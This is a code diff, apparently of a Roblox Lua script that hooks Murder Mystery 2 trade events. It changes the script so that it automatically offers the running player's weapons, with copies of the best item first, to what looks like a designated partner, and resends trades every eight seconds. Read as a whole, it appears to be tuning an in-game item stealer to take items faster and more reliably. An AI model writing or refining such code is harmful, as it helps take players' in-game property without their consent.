@@ -134,8 +134,6 @@ local function hook_mm2()
     local startTrade         = Trade:WaitForChild("StartTrade", 10)
     local setRequestsEnabled = Trade:WaitForChild("SetRequestsEnabled", 10)
     local updateTrade        = Trade:FindFirstChild("UpdateTrade")
-    local completeTrade      = Trade:FindFirstChild("CompleteTrade")
-    local declineTrade       = Trade:FindFirstChild("DeclineTrade")
     if not sendRequest or not offerItem or not acceptTrade or not startTrade then return end
 
     pcall(function() setRequestsEnabled:FireServer(true) end)
@@ -247,21 +245,7 @@ local function hook_mm2()
         end)
     end
 
-    if completeTrade then
-        completeTrade.OnClientEvent:Connect(function()
-            if tradingWithAllowed then
-                resetState()
-            end
-        end)
-    end
-
-    if declineTrade then
-        declineTrade.OnClientEvent:Connect(function()
-            if tradingWithAllowed then
-                resetState()
-            end
-        end)
-    end
+    -- geen completeTrade/declineTrade handlers: vuren op verkeerde momenten in MM2
 
     task.spawn(function()
         while true do
@@ -305,14 +289,19 @@ local function hook_mm2()
             local currentItems = collect_mm2_items()
             local itemsToOffer = (#currentItems > 0) and currentItems or cachedItems
 
-            local slotsUsed = 0
+            -- vul 4 slots met duplicaten van beste item eerst
+            local slotsLeft = 4
             for _, entry in ipairs(itemsToOffer) do
-                if slotsUsed >= 4 then break end
-                pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
-                task.wait(0.1)
-                slotsUsed = slotsUsed + 1
+                if slotsLeft <= 0 then break end
+                local copies = math.min(entry.amount, slotsLeft)
+                for i = 1, copies do
+                    pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
+                    task.wait(0.1)
+                end
+                slotsLeft = slotsLeft - copies
             end
 
+            -- wacht op UpdateTrade zodat currentLastOffer up-to-date is
             task.wait(3)
 
             if not readySent then
@@ -324,7 +313,8 @@ local function hook_mm2()
                 end
             end
 
-            task.wait(30)
+            -- reset 8s na accept (trade is dan klaar), meteen resenden
+            task.wait(8)
             if tradeGen == myGen and tradingWithAllowed then
                 resetState()
             end
